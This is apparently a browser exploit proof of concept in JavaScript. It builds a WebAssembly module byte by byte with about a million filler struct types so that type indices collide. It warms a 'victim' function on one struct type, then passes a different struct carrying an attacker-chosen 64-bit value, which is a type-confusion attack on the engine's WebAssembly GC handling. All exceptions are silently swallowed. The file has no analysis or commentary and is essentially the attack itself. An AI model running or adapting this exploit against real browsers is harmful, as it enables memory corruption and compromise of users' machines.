try {
    const COLLISION_OFFSET = 1 << 20;

    const TYPE_A_INDEX = 0;
    const TYPE_B_INDEX = COLLISION_OFFSET;

    const NUM_STRUCT_TYPES = COLLISION_OFFSET + 1;
    const VICTIM_FUNC_TYPE_INDEX = NUM_STRUCT_TYPES;
    const MAKE_A_FUNC_TYPE_INDEX = NUM_STRUCT_TYPES + 1;
    const MAKE_B_FUNC_TYPE_INDEX = NUM_STRUCT_TYPES + 2;
    const TOTAL_TYPES = NUM_STRUCT_TYPES + 3;

    const leb128 = n => {
        const bytes = [];
        do {
            let byte = n & 0x7f;
            n >>>= 7;
            if (n !== 0) {
                byte |= 0x80;
            }
            bytes.push(byte);
        } while (n !== 0);
        return bytes;
    };

    let wasm_sections = [];

    let type_content_parts = [];
    type_content_parts.push(new Uint8Array([0x4e, ...leb128(TOTAL_TYPES)]));
    type_content_parts.push(new Uint8Array([0x5b, 0x01, 0x7e, 0x00]));

    const filler_count = COLLISION_OFFSET - 1;
    const fillers_arr = new Uint8Array(filler_count * 2);
    for (let i = 0; i < filler_count; ++i) {
        fillers_arr[i * 2] = 0x5b;
        fillers_arr[i * 2 + 1] = 0x00;
    }
    type_content_parts.push(fillers_arr);

    type_content_parts.push(new Uint8Array([0x5b, 0x01, 0x7f, 0x00]));
    type_content_parts.push(new Uint8Array([0x60, 1, 0x63, ...leb128(TYPE_B_INDEX), 1, 0x7f]));
    type_content_parts.push(new Uint8Array([0x60, 1, 0x7e, 1, 0x63, ...leb128(TYPE_A_INDEX)]));
    type_content_parts.push(new Uint8Array([0x60, 1, 0x7f, 1, 0x63, ...leb128(TYPE_B_INDEX)]));

    const type_content_size = type_content_parts.reduce((s, p) => s + p.length, 0);
    const type_content = new Uint8Array(type_content_size);
    let offset = 0;
    for (const part of type_content_parts) {
        type_content.set(part, offset);
        offset += part.length;
    }
    wasm_sections.push([1, type_content]);

    const func_section = [3, ...leb128(VICTIM_FUNC_TYPE_INDEX), ...leb128(MAKE_A_FUNC_TYPE_INDEX), ...leb128(MAKE_B_FUNC_TYPE_INDEX)];
    wasm_sections.push([3, new Uint8Array(func_section)]);

    const victim_name = [118, 105, 99, 116, 105, 109];
    const make_a_name = [109, 97, 107, 101, 95, 65];
    const make_b_name = [109, 97, 107, 101, 95, 66];
    const export_section = [
        3,
        victim_name.length, ...victim_name, 0x00, 0,
        make_a_name.length, ...make_a_name, 0x00, 1,
        make_b_name.length, ...make_b_name, 0x00, 2,
    ];
    wasm_sections.push([7, new Uint8Array(export_section)]);

    const victim_body = [0x20, 0, 0xfb, 0x03, ...leb128(TYPE_B_INDEX), 0, 0x0b];
    const victim_func = [...leb128(victim_body.length + 1), 0, ...victim_body];
    const make_a_body = [0x20, 0, 0xfb, 0x07, ...leb128(TYPE_A_INDEX), 0x0b];
    const make_a_func = [...leb128(make_a_body.length + 1), 0, ...make_a_body];
    const make_b_body = [0x20, 0, 0xfb, 0x07, ...leb128(TYPE_B_INDEX), 0x0b];
    const make_b_func = [...leb128(make_b_body.length + 1), 0, ...make_b_body];
    const code_section = [3, ...victim_func, ...make_a_func, ...make_b_func];
    wasm_sections.push([10, new Uint8Array(code_section)]);

    let wasm_bytecode_parts = [new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00])];
    for (const [id, content] of wasm_sections) {
        wasm_bytecode_parts.push(new Uint8Array([id, ...leb128(content.length)]));
        wasm_bytecode_parts.push(content);
    }
    const final_size = wasm_bytecode_parts.reduce((s, p) => s + p.length, 0);
    const buffer = new Uint8Array(final_size);
    offset = 0;
    for (const part of wasm_bytecode_parts) {
        buffer.set(part, offset);
        offset += part.length;
    }

    WebAssembly.instantiate(buffer, {}).then(({
        instance
    }) => {
        const {
            make_A,
            make_B,
            victim
        } = instance.exports;
        const b = make_B(123);
        for (let i = 0; i < 100; i++) {
            victim(b);
        }
        const a = make_A(0x4142434445464748n);
        victim(a);
    }).catch(e => {});
} catch (e) {}